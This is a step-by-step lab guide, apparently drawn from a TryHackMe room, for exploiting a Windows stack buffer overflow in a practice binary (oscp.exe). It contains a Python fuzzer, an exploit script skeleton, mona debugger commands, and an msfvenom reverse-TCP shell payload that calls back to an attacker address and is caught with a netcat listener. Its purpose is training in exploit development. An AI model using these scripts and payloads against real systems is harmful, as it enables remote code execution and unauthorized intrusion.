# Windows Buffer Overflow - Steps

In this guide we look at the common steps for basic buffer overflows relating to Windows. This is heavily referenced from Tib4rius's Tryhackme room. 

[Tib3rius Material on Buffer Overflow](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)




## Basic Setup

1. Run Immunity Debugger in Admin mode
2. Make sure you have a working folder for Mona Modules

The working folder can be set up by
> **!mona config -set workingfolder c:\mona\%p**

With a working folder set up, it will be easier to compare the bad chars.



## Initial Fuzzing

Based on the way traffic needs to be sent to the target machine, you should make appropriate tweaks in your fuzzer. The basic outline of the fuzzer is as below.

```
import socket, time, sys

ip = "10.10.166.63"    # change this
port = 1337			   # change this
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")            # This will depend on the application to be overflown
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

- This will send strings in increasing size of 100 till 30 x 100 or 3000. 
- Make a note of the point where the overflow happens
- If this doesn't suffice then you need to make appropriate adjustments in counter size or buffer length



## Pattern Create

Next the length at which the buffer overflow happens - we will utilize the Metasploit's Pattern Create functionality to provide us with the payload to locate EIP
The pattern create can be done with

> **msf-pattern_create -l <>**


Syntax of msf-pattern_create
```
Usage: msf-pattern_create [options]
Example: msf-pattern_create -l 50 -s ABC,def,123
Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf

Options:
    -l, --length <length>            The length of the pattern
    -s, --sets <ABC,def,123>         Custom Pattern Sets
    -h, --help                       Show this message
```



## Crash Replication & Controlling EIP

Next up, we replicate the buffer overflow with the intention of capturing where the EIP register really is.  
For this we utilize the following script

```
import socket

ip = "10.10.166.63"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

In this script you put inside the payload the output that you had generated from ***msf-pattern_create*** in the previous step


Run this script on your attack machine and watch on Immunity when the application crashes once again.



## Using MONA to find offset 

We will now ascertain the value for **offset** field in our exploit script by giving the following command in the Immunity Debugger when the application has crashed.

> **!mona findmsp -distance length_of_payload**


Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view). You should see a line like

> **EIP contains normal pattern : ... (offset XXXX)**


At this point we do a few steps

1. Update exploit script by setting the offset variable to this value (previously set to 0)
2. Set payload variable to an empty string
3. Set RETN variable to 'BBBB'
4. Restart the application and run modified exploit. EIP should now be written with **4242 (BBBB)**




## Finding Bad Characters

This is where MONA modules can be leveraged heavily.

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

> **!mona bytearray -b "\x00"**

This will generate the bytearray. Now generate a string of bad characters from \x01 to \xff; identical to bytearray on your attack machine to be used in payload.

```
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```

Update your exploit.py script and set the **payload** variable to the string of bad chars the script generates.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the **ESP** register points and use it in the following mona command:

> **!mona compare -f C:\mona\oscp\bytearray.bin -a ADDRESS**

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.




## Finding a Jump Point

Next we find the jump instruction. 

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the **-cpb** option with **all the badchars** you identified (including \x00):

> **!mona jmp -r esp -cpb "\x00 + XXXXXXXX"**

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

Choose an address and update your exploit.py script, setting the **"retn"** variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.



## Generating a Payload

Generate payload with any msfvenom payload. Following will do too. Ensure you specify all the bad chars. 

> **msfvenom -p windows/shell_reverse_tcp LHOST=10.11.12.172 LPORT=1234 EXITFUNC=THREAD -b "\x00 + rest" -f py**

Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code.



## Prepending NOPs

Since an encoder can interfere with the payload. You will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:


> **padding="\x90"\*16**



## Exploit

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (1234 if you didn't change it).

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!





